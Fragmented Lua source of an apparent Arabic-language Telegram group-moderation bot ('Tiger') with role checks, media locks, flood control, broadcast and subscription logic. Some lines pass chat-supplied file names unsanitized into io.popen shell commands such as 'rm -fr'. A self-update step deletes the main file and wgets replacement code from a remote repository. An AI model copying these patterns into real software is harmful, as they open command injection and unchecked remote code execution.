...
local files_Tiger = database:smembers("files"..bot_id) 
print(Green.."\nFiles Now Started : \n "..reset)
for i,v in pairs(files_Tiger) do
print(Blue..i..red..' - \27[10;33m'..v..',\27[m')  end
print(Green.."\nThes all Files.\n\n\n"..reset)
io.popen("mkdir files_Tiger")
...
local keko_add_sudo = redis:get('Tiger:'..bot_id..'sudoo'..msg.sender_user_id_..'')
...
local var = false 
local admin = database:sismember('Tiger:'..bot_id..'admins:', user_id)
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end
end
local keko_add_sudo = redis:get('Tiger:'..bot_id..'sudoo'..user_id..'')
...
local var = false
local creatorbasic = database:sismember('Tiger:'..bot_id..'creatorbasic:'..chat_id, user_id) 
local creator = database:sismember('Tiger:'..bot_id..'creator:'..chat_id, user_id) 
local admin = database:sismember('Tiger:'..bot_id..'admins:', user_id)
...
chat_id = msg.chat_id_
local var = false
local mod = database:sismember('Tiger:'..bot_id..'mods:'..chat_id, user_id)  
local admin = database:sismember('Tiger:'..bot_id..'admins:', user_id)  
local owner = database:sismember('Tiger:'..bot_id..'owners:'..chat_id, user_id)
local creator = database:sismember('Tiger:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = database:sismember('Tiger:'..bot_id..'creatorbasic:'..chat_id, user_id)  
local vip = database:sismember('Tiger:'..bot_id..'vipgp:'..chat_id, user_id)
...
local var = false
local banned = database:sismember('Tiger:'..bot_id..'banned:'..chat_id, user_id)
...
local var = false
local banned = database:sismember('Tiger:'..bot_id..'gbanned:', user_id)
if banned then var = true end
return var
end
--         »»                 is_muted                         ««              --
...
local var = false
local banned = database:sismember('Tiger:'..bot_id..'muted:'..chat_id, user_id)
if banned then var = true end
return var
end
--         »»                 is_gmuted                         ««              --
...
local var = false 
local banned = database:sismember('Tiger:'..bot_id..'gmuted:', user_id)
if banned then var = true end
return var
end
...
k2342 = io.open("Tiger.lua")
--         »»                 check_filter_words                         ««              --
local function check_filter_words(msg, value)
local hash =  'Tiger:'..bot_id..'filters:'..msg.chat_id_
if hash then
...
{
{text = ''..(channel_ts or "Tiger TEAM")..'', url=''..(channel_user_ts or 't.me/TigerTEAM')..''},
},
}
...
for Tiger_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = Tiger_one
break
end
end
end 
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'Tigerteam')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(msg.sender_user_id_, keko333)
end
if value == "prore" then
function get_TigerX(Tigerx1,Tigerx2,Tigerx3)
local id_Tigerx = Tigerx2.sender_user_id_
function keko333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
...
info = '💁🏻‍♂️※ العضو ✓['..result.first_name_..'](t.me/'..(result.username_ or 'Tigerteam')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(id_Tigerx, keko333)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_TigerX)
end
...
info = '💁🏻‍♂️※ العضو ✓['..(result.first_name_ or value)..'](t.me/'..(result.username_ or 'Tigerteam')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
...
local res = http.request('http://Tiger.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
...
if not database:get( 'Tiger:'..bot_id.."charge:"..msg.chat_id_) then
...
if database:get( 'Tiger:'..bot_id.."charge:"..msg.chat_id_) then
database:del( 'Tiger:'..bot_id.."charge:"..msg.chat_id_)
function thsake_info(k1,k2)
...
local files_Tiger = database:smembers("files"..bot_id)
local keko = io.popen('cd files_Tiger && ls'):read("*all")
local files_Tiger2 = ''
for i=1,#files_Tiger do
files_Tiger2 = files_Tiger2..'{'..files_Tiger[i]..'}\n'
end
...
local f = load("files_Tiger/"..name_t[2]..".lua")
if f ~= "keko" then
ts23 = ""
if f:match("^(.*)(keko_Tiger)(.*)$") then
...
io.popen("rm -fr files_Tiger/"..name_t[2]..'.lua')
database:srem("files"..bot_id,name_t[2]..'.lua')
...
local Tigere = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. Tigere .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'files_Tiger/'..name_t[2]..'.lua' .. '"'
io.popen(curl)
end

if text:match("^اضف مطور$")  and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
if redis:sismember('Tiger:'..bot_id..'dev', result.sender_user_id_) then
tsX000("prore",msg,'☑┇بالفعل تم رفعه مطور')
else
redis:set('Tiger:'..bot_id..'sudoo'..result.sender_user_id_..'', 'yes')
redis:sadd('Tiger:'..bot_id..'dev', result.sender_user_id_)
...
if result.id_ then
redis:set('Tiger:'..bot_id..'sudoo'..result.id_..'', 'yes')
redis:sadd('Tiger:'..bot_id..'dev', result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'Tigerteam')..')\n\n☑┇تم رفعه مطور'
else
texts = '✖┇خطاء'
end
...
redis:set('Tiger:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
redis:sadd('Tiger:'..bot_id..'dev', apmd[2])
tsX000(apmd[2],msg,'☑┇تم رفعه مطور')
end

if text:match("^حذف مطور$")  and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
if not redis:sismember('Tiger:'..bot_id..'dev', result.sender_user_id_) then
tsX000("prore",msg,'☑┇ بالفعل تم تنزيله من المطورين')
else
redis:del('Tiger:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
redis:srem('Tiger:'..bot_id..'dev', result.sender_user_id_)
...
if result.id_ then
redis:del('Tiger:'..bot_id..'sudoo'..result.id_..'', 'no')
redis:srem('Tiger:'..bot_id..'dev', result.id_)
...
local hash =  'Tiger:'..bot_id..'gbanned:'
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'Tigerteam')..')\n🚫┇تم حظره من المجموعات البوت'
...
local hash =  'Tiger:'..bot_id..'gbanned:'
if result.id_ then
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'Tigerteam')..')\n��┇تم الغاء حظره من المجموعات البوت'
...
os.execute('cd libs && wget https://raw.githubusercontent.com/TigerTEAM/Tiger/master/libs/utils.lua')
os.execute('rm -rf Tiger.lua')
os.execute('wget https://raw.githubusercontent.com/TigerTEAM/Tiger/master/Tiger.lua')
os.exit()
return false
end
if text == "تفعيل"  then
...
if not database:get( 'Tiger:'..bot_id.."charge:"..msg.chat_id_) then
database:set( 'Tiger:'..bot_id.."charge:"..msg.chat_id_,true)
function thsake_info(k1,k2)
...
database:set( 'Tiger:'..bot_id.."enable:"..msg.chat_id_,true)
end end
getUser(msg.sender_user_id_, TSby)
end
end
...
database:set('Tiger:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((database:get("Tiger"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي المنشئ ~⪼ ("..msg.sender_user_id_..")\n☑️┇معرف المنشئ ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
...
database:sadd('Tiger:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)
end
database:set( 'Tiger:'..bot_id.."enable:"..msg.chat_id_,true)
if data.result.status == 'creator' then
database:sadd('Tiger:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_)
database:sadd('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_)
end
end
else
...
database:set('Tiger:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((database:get("Tiger"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام تعطيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
...
local tsX_o = database:get("lock_tag:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔖※ بالفعل تم قفل التاك ✓")
else
tsX000("lock",msg,"🔖※ تم قفل التاك ✓")
database:set("lock_tag:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الشارحه") then
local tsX_o = database:get("lock_sarha:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔗※ بالفعل تم قفل الشارحه ✓")
else
tsX000("lock",msg,"🔗※ تم قفل الشارحه ✓")
database:set("lock_sarha:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الكلايش") then
local tsX_o = database:get("lock_word:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🗞※ بالفعل تم قفل الكلايش ✓")
else
tsX000("lock",msg,"🗞※ تم قفل الكلايش ✓")
database:set("lock_word:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التعديل") and (is_creator(msg) or is_creatorbasic(msg)) then
local tsX_o = database:get("lock_edit:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🎛※ بالفعل تم قفل التعديل ✓")
else
tsX000("lock",msg,"🎛※تم قفل التعديل ✓")
database:set("lock_edit:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التكرار") then
local tsX_o = database:get("lock_lllll:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"⏳※ بالفعل تم قفل التكرار ✓")
else
tsX000("lock",msg,"⏳※ تم قفل التكرار ✓")
database:set("lock_lllll:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل المتحركه") then
local tsX_o = database:get("lock_gif:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"📽※ بالفعل تم قفل المتحركه ✓")
else
tsX000("lock",msg,"📽※ تم قفل المتحركه ✓")
database:set("lock_gif:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الملفات") then
local tsX_o = database:get("lock_files:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🗂※ بالفعل تم قفل الملفات ✓")
else
tsX000("lock",msg,"🗂※ تم قفل الملفات ✓")
database:set("lock_files:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الماركدون") then
local tsX_o = database:get("lock_mark:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🎗※ بالفعل تم قفل الماركدون ✓")
else
tsX000("lock",msg,"🎗※ تم قفل الماركدون ✓")
database:set("lock_mark:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الصور") then
local tsX_o = database:get("lock_photo:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"📷※ بالفعل تم قفل الصور ✓")
else
tsX000("lock",msg,"📷※ تم قفل الصور ✓")
database:set("lock_photo:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الملصقات") then
local tsX_o = database:get("lock_stecker:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🤡※ بالفعل تم قفل الملصقات ✓")
else
tsX000("lock",msg,"🤡※ تم قفل الملصقات ✓")
database:set("lock_stecker:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الفيديو") then
local tsX_o = database:get("lock_video:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"📹※ بالفعل تم قفل الفيديو ✓")
else
tsX000("lock",msg,"📹※ تم قفل الفيديو ✓")
database:set("lock_video:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الانلاين") then
local tsX_o = database:get("lock_inline:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🌐※ بالفعل تم قفل الانلاين ✓")
else
tsX000("lock",msg,"🌐※ تم قفل الانلاين ✓")
database:set("lock_inline:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الدردشه") then
local tsX_o = database:get("lock_chat:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"💌※ بالفعل تم قفل الدردشه ✓")
else
tsX000("lock",msg,"💌※ تم قفل الدردشه ✓")
database:set("lock_chat:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التوجيه") then
local tsX_o = database:get("lock_fwd:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"⛓※ بالفعل تم قفل التوجيه ✓")
else
tsX000("lock",msg,"⛓※ تم قفل التوجيه ✓")
database:set("lock_fwd:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التثبيت") then
local tsX_o = database:get("lock_pin:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔱※ بالفعل تم قفل التثبيت ✓")
else
tsX000("lock",msg,"🔱※ تم قفل التثبيت ✓")
database:set("lock_pin:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الاغاني") then
local tsX_o = database:get("lock_audeo:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🎵※ بالفعل تم قفل الاغاني ✓")
else
tsX000("lock",msg,"🎶※ تم قفل الاغاني ✓")
database:set("lock_audeo:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الصوت") then
local tsX_o = database:get("lock_voice:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🎙※ بالفعل تم قفل الصوت ✓")
else
tsX000("lock",msg,"🎙※ تم قفل الصوت ✓")
database:set("lock_voice:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الجهات") then
local tsX_o = database:get("lock_contact:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"☎️※ بالفعل تم قفل الجهات ✓")
else
tsX000("lock",msg,"☎️※ تم قفل الجهات ✓")
database:set("lock_contact:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل العربيه") then
local tsX_o = database:get("lock_ar:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"📋※ بالفعل تم قفل العربيه ✓")
else
tsX000("lock",msg,"📑※ تم قفل العربيه ✓")
database:set("lock_ar:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الانكليزيه") then
local tsX_o = database:get("lock_en:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"※ بالفعل تم قفل الانكليزيه ✓")
else
tsX000("lock",msg,"※ تم قفل الانكليزيه ✓")
database:set("lock_en:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الميديا") then
local tsX_o = database:get("lock_media:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"※ بالفعل تم قفل الميديا ✓")
else
tsX000("lock",msg,"※ تم قفل الميديا ✓")
database:set("lock_media:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_audeo:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_video:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_photo:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_stecker:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_voice:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_gif:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_note:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الروابط") then
local tsX_o = database:get("lock_link:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🃏※ بالفعل تم قفل الروابط ✓")
else
tsX000("lock",msg,"🃏※ تم قفل الروابط ✓")
database:set("lock_link:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل المعرف") then
local tsX_o = database:get("lock_username:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🀄️※ بالفعل تم قفل المعرف ✓")
else
tsX000("lock",msg,"🀄️※ تم قفل المعرف ✓")
database:set("lock_username:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الاشعارات") then
local tsX_o = database:get("lock_new:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"💭※ بالفعل تم قفل الاشعارات ✓")
else
tsX000("lock",msg,"💭※ تم قفل الاشعارات ✓")
database:set("lock_new:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل البوتات بالطرد") then
local tsX_o = database:get("lock_botAndBan:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔆※ بالفعل تم قفل البوتات بالطرد ✓")
else
tsX000("lock",msg,"🔆※ تم قفل البوتات بالطرد ✓")
database:set("lock_botAndBan:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل البوتات") then
local tsX_o = database:get("lock_bot:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🤖※ بالفعل تم قفل البوتات ✓")
else
tsX000("lock",msg,"🤖※ تم قفل البوتات ✓")
database:set("lock_bot:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الدخول") then
local tsX_o = database:get("lock_join:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
tsX000("lock",msg,"🔆※ بالفعل تم قفل الدخول للمجموعه ✓")
else
tsX000("lock",msg,"🔆※ تم قفل الدخول للمجموعه ✓")
database:set("lock_join:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل بصمه الفيديو") then
local tsX_o = database:get("lock_note:Tiger"..msg.chat_id_..bot_id)
if tsX_o then
...
database:del("lock_new:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_tag:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_word:Tiger"..msg.chat_id_..bot_id)
end
end
...
database:del("lock_sarha:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_lllll:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_edit:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_gif:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_files:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_mark:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_photo:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_stecker:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_video:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_inline:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_chat:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_fwd:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_pin:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_audeo:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_voice:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_botAndBan:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_contact:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_ar:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_en:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_media:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_audeo:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_video:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_photo:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_stecker:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_voice:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_gif:Tiger"..msg.chat_id_..bot_id,"ok")
database:del("lock_note:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_username:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_link:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_join:Tiger"..msg.chat_id_..bot_id,"ok")
end
end
...
database:del("lock_bot:Tiger"..msg.chat_id_..bot_id,"ok")
end
end  --         »»               End Tiger unlock                       ««              --
end 
end 
...
local text = msg.content_.text_
if text then 
if database:get("lock_word:Tiger"..msg.chat_id_..bot_id) then 
local Tiger_wr = (database:get("Tiger:not:word:"..bot_id..msg.chat_id_) or 100)
if #text >= tonumber(Tiger_wr) then
...
if database:get("lock_link:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
...
if database:get("lock_username:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
...
if database:get("lock_chat:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
if text and text:match("(.*)(/)(.*)")  then
if database:get("lock_sarha:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("(.*)(#)(.*)")  then
if database:get("lock_tag:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if  msg.content_.ID == "MessageChatJoinByLink" then
if database:get("lock_join:Tiger"..msg.chat_id_..bot_id) then
...
if database:get("lock_bot:Tiger"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
end
if database:get("lock_botAndBan:Tiger"..msg.chat_id_..bot_id) then
...
if database:get("lock_fwd:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
...
if database:get("lock_stecker:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then
if database:get("lock_new:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers" then
database:incr('Tiger:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessageUnsupported" then
if database:get("lock_note:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessagePhoto" then
if database:get("lock_photo:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageAudio" then
if database:get("lock_audeo:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageVoice" then
if database:get("lock_voice:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageVideo" then
if database:get("lock_video:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageAnimation" then
if database:get("lock_gif:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageContact" then
if database:get("lock_contact:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("[\216-\219][\128-\191]") then
if database:get("lock_ar:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageDocument" then
if database:get("lock_files:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if database:get("lock_en:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
...
if database:get("lock_mark:Tiger"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
...
if database:get("lock_lllll:Tiger"..msg.chat_id_..bot_id) then
...
local hash = 'Tiger:'..bot_id..'flood:time:'..msg.chat_id_
if not database:get(hash) then
floodTime = 1
else
...
database:set("lock_link:Tiger"..msg.chat_id_..bot_id,"ok")
database:set("lock_new:Tiger"..msg.chat_id_..bot_id,"ok")
database:set('Tiger:'..bot_id..'get:photo'..msg.chat_id_,true)
...
database:sadd('Tiger:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
end
end
...
if not database:get('Tiger:'..bot_id..'leave:groups') then
...
function promote_by_reply(extra, result, success)
database:del('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_)
database:sadd('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
database:del('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_)
database:sadd('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'Tigerteam')..')\n※ تم رفعة منشئ اساسي  في البوت ✓ 👨🏻‍✈️'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
...
database:del('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_)
database:sadd('Tiger:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
...
local list = database:smembers('Tiger:'..bot_id..'groups') 
...
local gps = database:scard('Tiger:'..bot_id.."groups")  
...
if (not database:get('Tiger:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
send(msg.chat_id_, msg.id_, 1, '☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه - ملف)', 1, 'md')
database:set("Tiger:set_if_bc_new:"..bot_id..msg.sender_user_id_,"ok")
return "Tiger"
else
...
send(msg.chat_id_, msg.id_, 1,'*📈※ عدد المجموعات الان ← ❪ '..#group..' ❫*'..Tiger..''..kara..'\n*🗳※ الان عدد المجموعات الحقيقي ← ❪ '..sendok..' ❫ مجموعات*', 1, 'md')   
end
end
end,nil)
end
...
local gps = database:scard('Tiger:'..bot_id.."groups") or 0
local user = database:scard('Tiger:'..bot_id.."userss") or 0
local gps2 = database:scard("thsake:gog"..bot_id) or 0
local gps9 = database:scard("thsake:good"..bot_id..os.date("%d")) or 0
local gps3 = database:scard('Tiger:'..bot_id..'pro:groups') or 0
...
local gps = database:smembers('Tiger:'..bot_id.."groups") or 0
local gps2 = database:smembers("thsake:gog"..bot_id) or 0
for i=1,#gps do
database:sadd("thsake:gog"..bot_id, gps[i])
database:set('Tiger:'..bot_id.."enable:"..gps[i],true)
database:set( 'Tiger:'..bot_id.."charge:"..gps[i],true)
end
...
database:del('Tiger:'..bot_id.."enable:"..gps[i])
database:del( 'Tiger:'..bot_id.."charge:"..gps[i])
end
...
database:del("thsake:gog"..bot_id)
database:del('Tiger:'..bot_id.."groups")
end
end 
if text:match("^روابط الكروبات$") then
local gpss = database:smembers('Tiger:'..bot_id.."groups") or 0
text233 = '📊┇روابط الكروبات\n\n'
for i=1, #gpss do
local link = database:get('Tiger:'..bot_id.."group:link"..gpss[i])
text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link or  "لا يوجد رابط").."\n"
end
local f = io.open('Tiger.txt', 'w')
f:write(text233)
f:close()
local Tigere = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. Tigere .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'Tiger.txt' .. '"'
io.popen(curl)
end
...
local time = a[2] * day
database:setex( 'Tiger:'..bot_id.."charge:"..msg.chat_id_,time,true)
database:set( 'Tiger:'..bot_id.."enable:"..msg.chat_id_,true)
...
local ex = database:ttl( 'Tiger:'..bot_id.."charge:"..txt[2])
if ex == -1 then
...
database:setex( 'Tiger:'..bot_id.."charge:"..txt[2],timeplan1,true)
...
database:set( 'Tiger:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, keko333)
end
...
database:setex( 'Tiger:'..bot_id.."charge:"..txt[2],timeplan2,true)
...
function keko333(extra,result,success)
keko_info = '@'..(result.username_ or 'لا يوجد')..''
database:set( 'Tiger:'..bot_id.."charge:"..txt[2],true)
...
return false 
      ...
      if (f:match('^(.*)(22Tiger)(.*)(bot_id)(.*)$')) then 
...
if (f:match('^(.*)(2fmaster)(.*)(Tiger)(.*)(elua)(.*)$')) then 
